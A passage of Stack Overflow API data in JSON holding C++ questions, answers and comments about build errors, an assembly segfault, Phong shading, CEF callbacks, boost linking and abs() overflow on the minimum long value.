29809733, "comment_id": 47747624, "body": "The compiler is <i>not</i> uncommenting code for you! You appear to have a dot after <code>-O3</code> in your Makefile, what&#39;s up with that? You need to provide a reproducible example. What you&#39;re suggesting is nonsensical at the moment."}, {"owner": {"reputation": 45031, "user_id": 213136, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0b84a36c241e04175fcec402dac43018?s=128&d=identicon&r=PG", "display_name": "Bob Jarvis - Reinstate Monica", "link": "https://stackoverflow.com/users/213136/bob-jarvis-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1429740626, "post_id": 29809733, "comment_id": 47747687, "body": "What operating system?"}, {"owner": {"reputation": 2163, "user_id": 1781548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/cae6c8f9ef172f395b2b183320804fe5?s=128&d=identicon&r=PG", "display_name": "Pippi", "link": "https://stackoverflow.com/users/1781548/pippi"}, "edited": false, "score": 0, "creation_date": 1429740703, "post_id": 29809733, "comment_id": 47747726, "body": "I&#39;m working in a mac."}, {"owner": {"reputation": 45031, "user_id": 213136, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0b84a36c241e04175fcec402dac43018?s=128&d=identicon&r=PG", "display_name": "Bob Jarvis - Reinstate Monica", "link": "https://stackoverflow.com/users/213136/bob-jarvis-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1429740812, "post_id": 29809733, "comment_id": 47747779, "body": "Could it be that you&#39;re linking with a library or something similar which has the &quot;old&quot; version of the code compiled into it?"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1429740924, "post_id": 29809733, "comment_id": 47747826, "body": "Which header file is that in? Are you sure the object file with that code got recompiled after you commented the line with <code>first i</code> out? Can you reproduce this problem now?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1429741048, "post_id": 29809733, "comment_id": 47747871, "body": "Is your header compiled to a pre-compiled header?"}, {"owner": {"reputation": 2163, "user_id": 1781548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/cae6c8f9ef172f395b2b183320804fe5?s=128&d=identicon&r=PG", "display_name": "Pippi", "link": "https://stackoverflow.com/users/1781548/pippi"}, "edited": false, "score": 0, "creation_date": 1429741257, "post_id": 29809733, "comment_id": 47747964, "body": "The main.cpp and header files are in the same directory as makefile. No pre-compiled header. No other library in the same folder or subfolder. I was using sublime text. I moved the entire directory to another directory, opened"}, {"owner": {"reputation": 2163, "user_id": 1781548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/cae6c8f9ef172f395b2b183320804fe5?s=128&d=identicon&r=PG", "display_name": "Pippi", "link": "https://stackoverflow.com/users/1781548/pippi"}, "edited": false, "score": 0, "creation_date": 1429741626, "post_id": 29809733, "comment_id": 47748119, "body": "I was using sublime text. I moved the entire directory to another directory, opened using Textwrangler, then the problem went away. It seems the problem may be sublime, first time experiencing this."}], "owner": {"reputation": 2163, "user_id": 1781548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/cae6c8f9ef172f395b2b183320804fe5?s=128&d=identicon&r=PG", "display_name": "Pippi", "link": "https://stackoverflow.com/users/1781548/pippi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429741740, "creation_date": 1429740182, "last_edit_date": 1429741740, "question_id": 29809733, "link": "https://stackoverflow.com/questions/29809733/strange-c-compilation-error-with-header-file-due-to-makefile-setting", "title": "Strange C++ compilation error with header file due to makefile setting?", "body": "<p>I have the following defined in the header file: </p>\n\n<pre><code>some function ...\n            if (table2[i] != \"\"){\n                new_table2[hash2(table2[i])] = table2[i];       \n                table2[i] = \"\";\n                }       \n            // std::cout &lt;&lt; \" first i : \" &lt;&lt; i  &lt;&lt; \"\\n\";\n        }\n\n\n        for (int i=0; i &lt; 150; ++i){\n            if (new_table1[i] != \"\" &amp;&amp; !try_insert(new_table1[i])){\n                std::cout &lt;&lt; \" bad rehash : \" &lt;&lt; i &lt;&lt; \" \" &lt;&lt; new_table1[i]  &lt;&lt; \"\\n\"; \n                rehash();\n            }\n        }\n</code></pre>\n\n<p>Makefile looks like this: </p>\n\n<pre><code>CC=g++\nCFLAGS=-Wall -Wextra -O3.\nDEPS = somehash.h hashfunctions.h \nOBJ = main.o\n\n%.o: %.c $(DEPS)\n    $(CC) -c -o $@ $&lt; $(CFLAGS)\n\nmain: $(OBJ)\n    g++ -o $@ $^ $(CFLAGS)\n\n\n.PHONY: clean\n\nclean:\n    rm -f *.o main \n</code></pre>\n\n<p>After I do make clean, make, and ./main, \"first i\" is still printed even though it is commented out. When I comment out \" bad rehash \", then both of them are not printed. It seems the compiler did some auto optimization that causes this to be cached? How can I fix it? </p>\n\n<p>Edit: I opened the file in another editor (was using Sublime), and the problem went away. It seem the problem is sublime. </p>\n"}, {"tags": ["c++", "assembly"], "answers": [{"comments": [{"owner": {"reputation": 150, "user_id": 3858962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HDQC2.jpg?s=128&g=1", "display_name": "Pnelego", "link": "https://stackoverflow.com/users/3858962/pnelego"}, "edited": false, "score": 0, "creation_date": 1429770141, "post_id": 29809727, "comment_id": 47757771, "body": "Sadly, this didn&#39;t  quite fix the problem (thanks for the tips though) could it be a problem in the c++ side of things? Thanks so much for your help."}, {"owner": {"reputation": 150, "user_id": 3858962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HDQC2.jpg?s=128&g=1", "display_name": "Pnelego", "link": "https://stackoverflow.com/users/3858962/pnelego"}, "edited": false, "score": 0, "creation_date": 1429800568, "post_id": 29809727, "comment_id": 47780228, "body": "That fixed everything, thank you for your help. (I cant believe I didn&#39;t see that)."}], "tags": [], "owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "is_accepted": true, "score": 2, "last_activity_date": 1429787035, "last_edit_date": 1429787035, "creation_date": 1429740167, "answer_id": 29809727, "question_id": 29809703, "link": "https://stackoverflow.com/questions/29809703/segmentation-fault-when-linking-c-and-assembly/29809727#29809727", "title": "Segmentation Fault when linking c++ and assembly", "body": "<p>Calling convention mandates you must preserve some registers. In your case, that applies to <code>ebx</code>. You should modify your code to save and restore that, such as:</p>\n\n<pre><code>getebx:\npush ebx\nmov eax, 0x0\ncpuid\nmov eax, ebx\npop ebx\nret\n</code></pre>\n\n<p>Also, putting code into the <code>.data</code> section isn't the best idea ;)</p>\n\n<p>Furthermore, <code>ebx</code> does not hold a string (a pointer to char) so you can not print it like that. It holds 4 characters, so something like this works better:</p>\n\n<pre><code>int main (){\n    unsigned ebx = getebx();\n    std::cout &lt;&lt; std::string((char*)&amp;ebx, 4) &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 150, "user_id": 3858962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HDQC2.jpg?s=128&g=1", "display_name": "Pnelego", "link": "https://stackoverflow.com/users/3858962/pnelego"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 249, "favorite_count": 0, "accepted_answer_id": 29809727, "answer_count": 1, "score": 1, "last_activity_date": 1429787035, "creation_date": 1429740034, "last_edit_date": 1429741680, "question_id": 29809703, "link": "https://stackoverflow.com/questions/29809703/segmentation-fault-when-linking-c-and-assembly", "title": "Segmentation Fault when linking c++ and assembly", "body": "<p>So I am trying to link a simple assembly script with c++, and so far no luck. </p>\n\n<p>Assembly Script</p>\n\n<pre><code>section .data\nglobal getebx\n\n\ngetebx:\nmov eax, 0x0\ncpuid\nmov eax, ebx\nret\n</code></pre>\n\n<p>c++</p>\n\n<pre><code>#include &lt;iostream&gt;\n\n\nextern \"C\" unsigned getebx();\n\nint main (){\n\nstd::cout &lt;&lt; (const char *)getebx()&lt;&lt; std::endl;\nreturn 0;\n}\n</code></pre>\n\n<p>And to build i am simply running the following commands.</p>\n\n<pre><code>nasm -f elf32 cpuidtest.asm\ng++ -m32 -g main.cc cpuidtest.o\n</code></pre>\n\n<p>When I ran the executable I got a Segmentation Fault (Core dumped) error. So my next instinct was to take it to gdb. Here is what it returned:</p>\n\n<pre><code>   program received signal SIGSEGV, Segmentation fault.\n   0xf7da0e86 in ?? () from /lib/i386-linux-gnu/libc.so.6\n</code></pre>\n\n<p>How can I fix this problem? Thank you in advance.</p>\n"}, {"tags": ["c++", "raytracing", "phong"], "comments": [{"owner": {"reputation": 18362, "user_id": 1767754, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/00ba1fd17dc5970a0096cc4d7a932536?s=128&d=identicon&r=PG", "display_name": "user1767754", "link": "https://stackoverflow.com/users/1767754/user1767754"}, "edited": false, "score": 0, "creation_date": 1429740264, "post_id": 29809648, "comment_id": 47747533, "body": "Can you post an image?"}, {"owner": {"reputation": 18362, "user_id": 1767754, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/00ba1fd17dc5970a0096cc4d7a932536?s=128&d=identicon&r=PG", "display_name": "user1767754", "link": "https://stackoverflow.com/users/1767754/user1767754"}, "edited": false, "score": 0, "creation_date": 1429740876, "post_id": 29809648, "comment_id": 47747802, "body": "Your specular power should be much higher 128 e.g.  and is your camera normalized as well?"}, {"owner": {"reputation": 961, "user_id": 2079306, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/Wm1fn.jpg?s=128&g=1", "display_name": "john stamos", "link": "https://stackoverflow.com/users/2079306/john-stamos"}, "reply_to_user": {"reputation": 18362, "user_id": 1767754, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/00ba1fd17dc5970a0096cc4d7a932536?s=128&d=identicon&r=PG", "display_name": "user1767754", "link": "https://stackoverflow.com/users/1767754/user1767754"}, "edited": false, "score": 0, "creation_date": 1429745294, "post_id": 29809648, "comment_id": 47749471, "body": "The Camera and sphere normal that are passed in are both normalized.  I don&#39;t have to normalize the specular power do I?  Or light intensity?"}, {"owner": {"reputation": 961, "user_id": 2079306, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/Wm1fn.jpg?s=128&g=1", "display_name": "john stamos", "link": "https://stackoverflow.com/users/2079306/john-stamos"}, "reply_to_user": {"reputation": 18362, "user_id": 1767754, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/00ba1fd17dc5970a0096cc4d7a932536?s=128&d=identicon&r=PG", "display_name": "user1767754", "link": "https://stackoverflow.com/users/1767754/user1767754"}, "edited": false, "score": 0, "creation_date": 1429745769, "post_id": 29809648, "comment_id": 47749643, "body": "Added image for you."}, {"owner": {"reputation": 18362, "user_id": 1767754, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/00ba1fd17dc5970a0096cc4d7a932536?s=128&d=identicon&r=PG", "display_name": "user1767754", "link": "https://stackoverflow.com/users/1767754/user1767754"}, "edited": false, "score": 0, "creation_date": 1429773472, "post_id": 29809648, "comment_id": 47759776, "body": "No not the lightinsentiy or specular power, they are just multipliers. Is you camera, normal in view-space?"}], "owner": {"reputation": 961, "user_id": 2079306, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/Wm1fn.jpg?s=128&g=1", "display_name": "john stamos", "link": "https://stackoverflow.com/users/2079306/john-stamos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 330, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429745755, "creation_date": 1429739825, "last_edit_date": 1429745755, "question_id": 29809648, "link": "https://stackoverflow.com/questions/29809648/phong-implementation-seems-dark-and-also-specular-not-working-ray-tracing", "title": "Phong implementation seems dark and also specular not working. Ray tracing", "body": "<p>Below is my phong implementation method where I am drawing a sphere.  Its parameters are vec3 sphere normal (which is my vec3 hitpoint - vec3 sphereOrigin) and the camera position vec3 (0,0,-5).  </p>\n\n<p>Using couts I find that the dot product in my specular calculation is returning ~ -4.9xxx, so 0 always wins in the max function it is contained in, and also makes the rest of the line redundant because it's 0.  Is there something wrong with this method?  </p>\n\n<p>Also it seems very dark,  I crank up my light intensity to (5,5,5) for a nicer sphere.</p>\n\n<pre><code>vec3 implementPhong(vec3 normal, vec3 camera){\n    vec3 lightSource1(0,0,-1); \n    vec3 nLightSource1 = normalize(lightSource1);\n    float zero = 0;\n\n    //Material properties brass\n    vec3 ambient(0.329412, 0.223529, 0.027451);\n    vec3 diffuse_albedo = vec3(0.780392, 0.568627, 0.113725);\n    vec3 specular_albedo = vec3(0.992157,0.941176,0.807843);\n    float specular_power = 27.8974;\n    vec3 light_intensity = vec3(1,1,1);\n\n    vec3 realLight = light_intensity * nLightSource1;\n\n    vec3 reflection = reflect(-realLight, normal);\n\n    vec3 diffuse = std::max&lt;float&gt;(dot(normal, realLight), zero) * diffuse_albedo;\n\n    vec3 specular = pow(std::max&lt;float&gt;(dot(reflection, camera), zero), specular_power) * specular_albedo;\n\n    vec3 color = ambient + diffuse + specular;\n    return color;\n}\n</code></pre>\n\n<p>Current image: <a href=\"http://imgur.com/U1ihxS0\" rel=\"nofollow\">http://imgur.com/U1ihxS0</a>  Phong only attempted on the front sphere atm.</p>\n"}, {"tags": ["javascript", "c++"], "answers": [{"tags": [], "owner": {"reputation": 315, "user_id": 2646536, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/6f9e1422af2eb3714b91f1c88ed6a406?s=128&d=identicon&r=PG", "display_name": "Swtsvn", "link": "https://stackoverflow.com/users/2646536/swtsvn"}, "is_accepted": false, "score": 2, "last_activity_date": 1553352485, "last_edit_date": 1553352485, "creation_date": 1429801112, "answer_id": 29827267, "question_id": 29809593, "link": "https://stackoverflow.com/questions/29809593/rg-onwebkitinitialized-not-being-invoked/29827267#29827267", "title": "Rg. OnWebKitInitialized not being invoked", "body": "<p>Found the solution. </p>\n\n<p><a href=\"http://www.magpcss.org/ceforum/viewtopic.php?f=6&amp;t=12909\" rel=\"nofollow noreferrer\">http://www.magpcss.org/ceforum/viewtopic.php?f=6&amp;t=12909</a></p>\n\n<p>Quoting the member answer : </p>\n\n<blockquote>\n  <p>OnWebKitInitialized and other CefRenderProcessHandler methods are called in the renderer process. You need to implement \"CefApp::GetRenderProcessHandler()\" and pass the CefApp instance to CefExecuteProcess().</p>\n</blockquote>\n"}], "owner": {"reputation": 315, "user_id": 2646536, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/6f9e1422af2eb3714b91f1c88ed6a406?s=128&d=identicon&r=PG", "display_name": "Swtsvn", "link": "https://stackoverflow.com/users/2646536/swtsvn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 918, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1553352485, "creation_date": 1429739638, "question_id": 29809593, "link": "https://stackoverflow.com/questions/29809593/rg-onwebkitinitialized-not-being-invoked", "title": "Rg. OnWebKitInitialized not being invoked", "body": "<p>Respected Javascript users, </p>\n\n<p>I am using CEF to bind JS with C++.I am running into the issue that OnWebKitInitialized is not being invoked at all. The native code binding is solely depending on this callback (correct me if I am wrong. But the only way the JS can call C++ is via this OnWebKitInitialized and Execute methods).</p>\n\n<p>Here is the pseudo code for the initialization process:</p>\n\n<pre><code> void OnInit(){\n   HINSTANCE instance = wxGetInstance();\n    CefMainArgs main_args(instance);\n\n    CefRefPtr&lt;CefApp&gt; app = new MainHandler();\n   int exit_code = CefExecuteProcess(main_args, app, nullptr);\n   if (exit_code &gt;= 0) {\n    // The sub-process has completed so return here.\n    return false;\n   }\n\n   // Specify CEF global settings here.\n   CefSettings settings;\n   settings.no_sandbox = true;\n   settings.multi_threaded_message_loop = true;\n\n\n   settings.ignore_certificate_errors = true;\n\n   // Initialize CEF.\n   CefInitialize(main_args, settings, app, nullptr);\n</code></pre>\n\n<p>}</p>\n\n<p>Then in MainHandle class : </p>\n\n<pre><code>class MainHandle :  public CefApp, public CefBrowserProcessHandler, public CefRenderProcessHandler\n{\n\n  virtual OnContextCreated //full syntax\n  virtual void OnContextInitialized() override;\n  virtual void OnWebKitInitialized();\n  void OnRenderProcessThreadCreated(CefRefPtr&lt;CefListValue&gt; extra_info) ;\n\n  ..other related code\n}\n</code></pre>\n\n<p>Here OnContextInitialized and OnRenderProcessThreadCreated are  being called, because the MainHandle is a subclass of browser process handler. But none of render process handler callbacks are being called. </p>\n\n<p>Any one know how to make the OnWebKitInitialized get invoked? or if something might be wrong with the code above that might hinder the callback calling?</p>\n"}, {"tags": ["c++", "linux", "ubuntu", "boost-thread"], "comments": [{"owner": {"reputation": 4666, "user_id": 308705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f4bcb2a149fa7750b641c14a1c2d51?s=128&d=identicon&r=PG", "display_name": "jsantander", "link": "https://stackoverflow.com/users/308705/jsantander"}, "edited": false, "score": 0, "creation_date": 1429740292, "post_id": 29809555, "comment_id": 47747543, "body": "I guess you&#39;re trying to build a shared library. However the compiler is complaining that the code from libboost_thread-gcc48-mt-1_58.a (the library it has found for -lboost_thread-gcc48-mt-1_58) is not re-locatable. If you have a libboost_thread-gcc48-mt-1_58.so, make sure it is used (see this <a href=\"http://stackoverflow.com/questions/4422493/how-to-force-linker-to-use-shared-library-instead-of-static-library\">question</a>), Otherwise, not 100% sure, but you might want to try to leave the static library out of the shared library you&#39;re building. It will need to be added when linking the full program."}, {"owner": {"reputation": 42006, "user_id": 3807729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UEUbF.jpg?s=128&g=1", "display_name": "Galik", "link": "https://stackoverflow.com/users/3807729/galik"}, "edited": false, "score": 0, "creation_date": 1429740326, "post_id": 29809555, "comment_id": 47747558, "body": "&quot;recompile with -fPIC&quot; - did you try adding that to the compiler flags?"}, {"owner": {"reputation": 11, "user_id": 2998472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/179d68992a10fab84dc8bbb60dc90029?s=128&d=identicon&r=PG&f=1", "display_name": "George Carvalho", "link": "https://stackoverflow.com/users/2998472/george-carvalho"}, "reply_to_user": {"reputation": 4666, "user_id": 308705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f4bcb2a149fa7750b641c14a1c2d51?s=128&d=identicon&r=PG", "display_name": "jsantander", "link": "https://stackoverflow.com/users/308705/jsantander"}, "edited": false, "score": 0, "creation_date": 1429742107, "post_id": 29809555, "comment_id": 47748321, "body": "@jsantander, so should I use: -l:libboost_thread-gcc48-mt-1_58.so ?"}, {"owner": {"reputation": 4666, "user_id": 308705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f4bcb2a149fa7750b641c14a1c2d51?s=128&d=identicon&r=PG", "display_name": "jsantander", "link": "https://stackoverflow.com/users/308705/jsantander"}, "edited": false, "score": 0, "creation_date": 1429742264, "post_id": 29809555, "comment_id": 47748391, "body": "Have you checked if the *.so library exists? To tell the truth, I&#39;ve never used personally that syntax..."}, {"owner": {"reputation": 11, "user_id": 2998472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/179d68992a10fab84dc8bbb60dc90029?s=128&d=identicon&r=PG&f=1", "display_name": "George Carvalho", "link": "https://stackoverflow.com/users/2998472/george-carvalho"}, "edited": false, "score": 0, "creation_date": 1429742873, "post_id": 29809555, "comment_id": 47748613, "body": "It does: <code>-rw-r--r-- 1 root root 273466 Apr 22 18:26 libboost_thread-gcc48-mt-1_58.a lrwxrwxrwx 1 root root     39 Apr 22 18:26 libboost_thread-gcc48-mt-1_58.so -&gt; libboost_thread-gcc48-mt-1_58.so.1.58.0 -rwxr-xr-x 1 root root 175686 Apr 22 18:26 libboost_thread-gcc48-mt-1_58.so.1.58.0</code>"}, {"owner": {"reputation": 11, "user_id": 2998472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/179d68992a10fab84dc8bbb60dc90029?s=128&d=identicon&r=PG&f=1", "display_name": "George Carvalho", "link": "https://stackoverflow.com/users/2998472/george-carvalho"}, "edited": false, "score": 0, "creation_date": 1429746765, "post_id": 29809555, "comment_id": 47749965, "body": "Good news! I found the solution, but wasn&#39;t what I wanted, however did it work. I just dynamically linked libboost_thread-gcc48-mt-1_58.so with <code>-Bdynamic</code> and moved libboost_thread-gcc48-mt-1_58 and libboost_system-gcc48-mt-1_58 files to <code>&#47;usr&#47;lib</code>and link them with <code>ln</code> command. I hope that helps who got that problem too."}], "owner": {"reputation": 11, "user_id": 2998472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/179d68992a10fab84dc8bbb60dc90029?s=128&d=identicon&r=PG&f=1", "display_name": "George Carvalho", "link": "https://stackoverflow.com/users/2998472/george-carvalho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 287, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1429771013, "creation_date": 1429739507, "last_edit_date": 1429771013, "question_id": 29809555, "link": "https://stackoverflow.com/questions/29809555/issues-to-build-project-with-boost-thread", "title": "Issues to build project with boost-thread", "body": "<p>I'm trying to build my project using boost-thread, but I'm getting the following error:</p>\n\n<pre><code> /usr/bin/ld.bfd.real: ./boost/boost_1_58_0/stage/lib/libboost_thread-gcc48-mt-1_58.a(thread.o): relocation R_X86_64_32 against '.text' can not be used when making a shared object; recompile with -fPIC ./boost/boost_1_58_0/stage/lib/libboost_thread-gcc48-mt-1_58.a: could not read symbols: Bad value\n\n collect2: error: ld returned 1 exit status\n\n make[1]: * * * [objdir/rel64/xerel64.so] Error 1\n\n make[1]: Leaving directory `/home/xe'\n\n make: * * * [build64] Error 2\n</code></pre>\n\n<p>I did already built libboost_thread with <code>address-model=64_32 architecture=combined</code> and with <code>address-model=64 architecture=combined</code>, and didn't work.</p>\n\n<p>Here's how I build it:</p>\n\n<pre><code>g++ -Wl,-Bsymbolic -L./lib -L./cryptopp -shared -L./mysql/lib\n-L./boost/boost_1_58_0/stage/lib -shared -m64 -s -o objdir/rel64/xerel64.so\nobjdir/rel64/./Callbacks.o  objdir/rel64/./CAnnounceBox.o  objdir/rel64/./CClans.o\nobjdir/rel64/./CCommands.o  objdir/rel64/./CCore.o  objdir/rel64/./CFunctions.o\nobjdir/rel64/./CIRC.o  objdir/rel64/./CPlayer.o  objdir/rel64/./CSettings.o\nobjdir/rel64/./CVehicle.o  objdir/rel64/./Main.o -Wl,-Bstatic -lmysqlclient64\n-lcrypto64  -lboost_thread-gcc48-mt-1_58 -Wl,-Bdynamic -ldl -lpthread -lrt\n</code></pre>\n"}, {"tags": ["c++", "c++11", "numeric-limits"], "comments": [{"owner": {"reputation": 6533, "user_id": 1918193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b70a14318e0f417ecac47809f38fafc?s=128&d=identicon&r=PG", "display_name": "Marc Glisse", "link": "https://stackoverflow.com/users/1918193/marc-glisse"}, "edited": false, "score": 2, "creation_date": 1429739522, "post_id": 29809537, "comment_id": 47747161, "body": "Please specify on which computer/compiler you got which result. With 2&#39;s complement, <code>-min()</code> cannot be represented."}, {"owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "edited": false, "score": 0, "creation_date": 1429739761, "post_id": 29809537, "comment_id": 47747281, "body": "If you print <code>numeric_limits&lt;long&gt;::min()</code>, is the value that you would expect to get via <code>abs()</code> smaller than <code>numeric_limits&lt;long&gt;::max()</code>?"}, {"owner": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "edited": false, "score": 0, "creation_date": 1429739799, "post_id": 29809537, "comment_id": 47747301, "body": "similiar to <a href=\"http://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min\">this</a> question asked earlier?"}], "answers": [{"tags": [], "owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "is_accepted": false, "score": 2, "last_activity_date": 1429739886, "creation_date": 1429739886, "answer_id": 29809663, "question_id": 29809537, "link": "https://stackoverflow.com/questions/29809537/c11-abs-of-numeric-limitslongmin/29809663#29809663", "title": "C++11 abs() of numeric_limits&lt;long&gt;::min();", "body": "<p>In 2's complement (which is the integer representation used by most modern chips) there is always 1 more negative value than positive - e.g. <code>signed char</code> on most implementations runs from -128 to 127. What do you expect to get if you did <code>-((signed char)-128)</code> given 127 is the largest positive number that a signed char can represent?</p>\n\n<p>You've got a similar issue with your (signed) long that -(most negative long) isn't representable and overflow happens. Overflow for <em>signed</em> integers is undefined so its unsurprising you get a weird result</p>\n"}, {"tags": [], "owner": {"reputation": 85, "user_id": 4682263, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/022462f15738a6bbf306077b5f429d13?s=128&d=identicon&r=PG&f=1", "display_name": "argetlam5", "link": "https://stackoverflow.com/users/4682263/argetlam5"}, "is_accepted": false, "score": 1, "last_activity_date": 1429740174, "creation_date": 1429740174, "answer_id": 29809729, "question_id": 29809537, "link": "https://stackoverflow.com/questions/29809537/c11-abs-of-numeric-limitslongmin/29809729#29809729", "title": "C++11 abs() of numeric_limits&lt;long&gt;::min();", "body": "<p>The reason you would get a negative number from this is because of the way computers read signed numbers, two's complement. If a number type holds 4 bits then the boundary numbers this type could be are 0111 = 7 and 1000 = -8. When you use the abs() function it flips the bits then adds one to negative numbers to make them positive. When you do this to the minimum number you get 1000 =>flip bits=> 0111 =>add one=> 1000 which is the same number.</p>\n"}, {"tags": [], "owner": {"reputation": 6874, "user_id": 1942027, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc12ed2dd9e8cf4e2fe7c33e65c75210?s=128&d=identicon&r=PG&f=1", "display_name": "user1942027", "link": "https://stackoverflow.com/users/1942027/user1942027"}, "is_accepted": true, "score": 2, "last_activity_date": 1429742310, "last_edit_date": 1592644375, "creation_date": 1429742310, "answer_id": 29810196, "question_id": 29809537, "link": "https://stackoverflow.com/questions/29809537/c11-abs-of-numeric-limitslongmin/29810196#29810196", "title": "C++11 abs() of numeric_limits&lt;long&gt;::min();", "body": "<p>A look at a reference for <a href=\"http://en.cppreference.com/w/cpp/numeric/math/abs\" rel=\"nofollow noreferrer\"><code>std::abs</code></a> tells us what's going wrong:</p>\n<blockquote>\n<p>Computes the absolute value of an integer number. <strong>The behavior is undefined if the result cannot be represented by the return type.</strong></p>\n</blockquote>\n<p>So anything can happen. It even explains below how that's the case for systems that use 2's complement for signed integers:</p>\n<blockquote>\n<p><strong>Notes</strong></p>\n<p>In 2's complement systems, the absolute value of the most-negative value is out of range, e.g. for 32-bit 2's complement type int, INT_MIN is -2147483648, but the would-be result 2147483648 is greater than INT_MAX, which is 2147483647.</p>\n</blockquote>\n<p>If you're interested about the actual standard references it's in section 7.20.6/7.22.6 for the <a href=\"https://stackoverflow.com/q/81656/1942027\">C99/C11 standard</a> respectively, since the C++ only references the C standard for the functions in <code>&lt;cstdlib&gt;</code> (with some extra overloads).</p>\n"}], "owner": {"reputation": 350, "user_id": 883385, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/fI3qk.jpg?s=128&g=1", "display_name": "Misbah Khan", "link": "https://stackoverflow.com/users/883385/misbah-khan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 766, "favorite_count": 0, "accepted_answer_id": 29810196, "answer_count": 3, "score": 2, "last_activity_date": 1429742310, "creation_date": 1429739430, "question_id": 29809537, "link": "https://stackoverflow.com/questions/29809537/c11-abs-of-numeric-limitslongmin", "title": "C++11 abs() of numeric_limits&lt;long&gt;::min();", "body": "<p>I'm running the following </p>\n\n<p>test.cpp</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;limits&gt;\n#include &lt;cstdlib&gt;\nusing namespace std;\n\nint main(int argc, char** argv) {\n    long value = numeric_limits&lt;long&gt;::min();\n    value = abs(value);\n    cout &lt;&lt; value &lt;&lt; endl;\n}\n</code></pre>\n\n<p>Depending on what computer I compile and run the program on, I'm getting different results. </p>\n\n<p>Either I get: </p>\n\n<pre><code>abs(numeric_limits&lt;long&gt;::min())\n</code></pre>\n\n<p>Or I get: </p>\n\n<pre><code>numeric_limits&lt;long&gt;::min()\n</code></pre>\n\n<p>In the latter case, abs() doesn't seem to be performed. I'm wondering what accounts for this difference and how I should accommodate it. Should I compute abs() in a different way? </p>\n"}, 